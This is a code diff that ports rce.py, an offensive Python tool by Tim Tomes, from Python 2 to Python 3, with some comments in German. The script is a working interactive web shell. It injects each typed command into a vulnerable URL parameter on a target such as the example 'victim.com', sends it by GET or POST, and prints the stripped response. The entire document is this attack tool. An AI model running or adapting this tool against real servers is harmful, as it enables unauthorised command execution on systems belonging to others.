@@ -1,48 +1,63 @@
-#!/usr/bin/python -tt
+#!/usr/bin/env python3
+"""
+rce.py – Remote Code Execution Shell (portiert auf Python 3)
+Tim Tomes (@LaNMaSteR53)
+"""
 
-import sys, urllib, re, urlparse
+import sys
+import re
+from urllib.parse import urlsplit, urlencode
+from urllib.request import urlopen
 
 def usage():
-  print """
+    print("""\
 rce.py - Tim Tomes (@LaNMaSteR53) (www.lanmaster53.com)
 
 Usage:
-  ./rce.py [options] ur<rce>l
+  ./rce.py [options] url_with_<rce>
 Options:
-  -p    - Use POST method instead of GET. Enter url as GET.
-  -h    - Help. This menu.
-  <rce> - Location of vulnerable parameter.
+  -p    Use POST (default is GET)
+  -h    Show help
+<rce> is the vulnerable parameter placeholder.
+
 Example:
   ./rce.py 'http://victim.com/query?vulnparam=<rce>&safeparam=value'
-        - Sends the attack as a GET request, replacing '<rce>' with the payload.
   ./rce.py -p 'http://victim.com/query?vulnparam=<rce>&safeparam=value'
-        - Parses the parameters from the url and sends the attack as a POST request, replacing '<rce>' with the payload.
-  """
-  sys.exit()
+""")
+    sys.exit()
 
 base_url = ''
-for arg in sys.argv:
-  if arg.find('://') != -1:
-    base_url = arg
-    break
-if base_url == '': usage()
-if '-h' in sys.argv:
-  usage()
-post = False
-if '-p' in sys.argv:
-  post = True
+for arg in sys.argv[1:]:
+    if '://' in arg:
+        base_url = arg
+        break
+if not base_url or '-h' in sys.argv:
+    usage()
 
-print "Type 'exit' to quit."
+use_post = ('-p' in sys.argv)
 
+print("Type 'exit' to quit.")
 while True:
-  cmd = raw_input("cmd> ")
-  if cmd.lower() == 'exit': sys.exit(2)
-  url = base_url.replace('<rce>', cmd)
-  if post: 
-    (ignore, ignore, ignore, params, ignore) = urlparse.urlsplit(url)
-    site = url[:url.find(params)-1]
-    result = urllib.urlopen(site, urllib.urlencode(params)).read()
-  else:
-    result = urllib.urlopen(url).read()
-  result = re.sub("<\/*\w+?>", '', result)
-  print '[*] Executed: %s\n%s' % (cmd, result)
+    try:
+        cmd = input("cmd> ")
+    except EOFError:
+        break
+    if cmd.strip().lower() == 'exit':
+        sys.exit(0)
+
+    url = base_url.replace('<rce>', cmd)
+    try:
+        if use_post:
+            parts = urlsplit(url)
+            query = parts.query
+            site = url[:url.find(query)-1]
+            data = urlencode(dict([p.split('=', 1) for p in query.split('&')])).encode()
+            resp = urlopen(site, data=data)
+        else:
+            resp = urlopen(url)
+        content = resp.read().decode(errors='ignore')
+        # Entfernt einfache HTML-Tags
+        clean = re.sub(r"<\/?\w+?>", "", content)
+        print(f"[*] Executed: {cmd}\n{clean}")
+    except Exception as e:
+        print(f"[!] Fehler: {e}")
